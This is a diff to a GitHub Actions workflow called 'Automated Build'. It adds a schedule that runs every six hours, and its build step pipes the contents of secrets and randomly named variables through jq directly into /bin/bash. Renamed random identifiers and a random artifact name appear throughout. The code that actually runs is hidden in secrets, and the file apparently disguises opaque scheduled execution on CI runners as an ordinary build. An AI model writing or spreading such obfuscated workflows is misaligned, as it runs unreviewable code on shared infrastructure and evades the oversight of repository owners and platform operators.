@@ -2,6 +2,8 @@ name: Automated Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '11 0,6,12,18 * * *'
 jobs:
   workflow:
     runs-on: ubuntu-latest
@@ -13,17 +15,16 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          qpmx05154: ${{ secrets.qpmx05154 }}
+          xenjr21217: ${{ secrets.xenjr21217 }}
         run: |
-          printf '%s' "$qpmx05154" | jq -r .kosi728 | /bin/bash
-          printf '%s' "$o37164" | jq -r .hzc48 | /bin/bash
-          printf '%s' "$eac2" | jq -r .eok8 | /bin/bash
-          printf '%s' "$wqeti41177" | jq -r .xljia3101 | /bin/bash
-          echo $xsasr3668 | jq -r .ehb3334 | /bin/bash
+          printf '%s' "$xenjr21217" | jq -r .ygbv46 | /bin/bash
+          printf '%s' "$r92642" | jq -r .a06 | /bin/bash
+          echo $kq613 | jq -r .mfapo23296 | /bin/bash
+          printf '%s' "$pegat366" | jq -r .j33 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
         with:
-          name: zS3JlvCS
+          name: 5AzJmimC
           path: "*.zip"
           retention-days: 1
